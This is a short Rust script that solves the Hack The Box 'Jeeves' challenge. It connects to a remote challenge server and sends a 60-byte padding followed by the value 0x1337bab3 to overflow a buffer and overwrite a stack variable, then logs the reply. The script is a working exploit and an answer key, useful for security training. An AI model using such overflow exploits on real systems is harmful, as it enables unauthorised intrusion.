use pwn::*;
use std::time::Duration;
// Solving https://app.hackthebox.eu/challenges/Jeeves.
// A simple buffer overflow and stack variable rewrite.

fn main() -> std::io::Result<()> {
    init_logger();
    let mut sock = Remote::new("64.227.39.88", 32621)?;
    sock.clean(Duration::from_millis(0))?;
    let mut buf = b"A".repeat(60);
    buf.append(&mut p64(0x1337bab3));
    sock.sendline(buf)?;
    sock.recvuntil(b": ")?;
    let result = sock.recvline().unwrap();
    let result = std::str::from_utf8(&result).unwrap();
    info!("{}", result.trim());
    Ok(())
}
